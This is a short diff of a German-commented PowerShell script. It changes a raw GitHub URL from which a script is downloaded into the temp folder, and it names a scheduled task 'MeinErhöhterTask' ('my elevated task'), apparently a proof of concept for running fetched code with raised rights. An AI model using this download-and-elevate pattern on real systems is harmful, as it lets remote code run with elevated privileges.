@@ -1,5 +1,5 @@
 # Definiere die URL und den Pfad, wo das Skript gespeichert werden soll
-$scriptUrl = "https://raw.githubusercontent.com/Lorcan84/test/main/calc"
+$scriptUrl = "https://raw.githubusercontent.com/Lorcan84/test/main/notepad"
 $localScriptPath = "$env:TEMP\downloaded_script.ps1"
 $taskName = "MeinErhöhterTask"
 
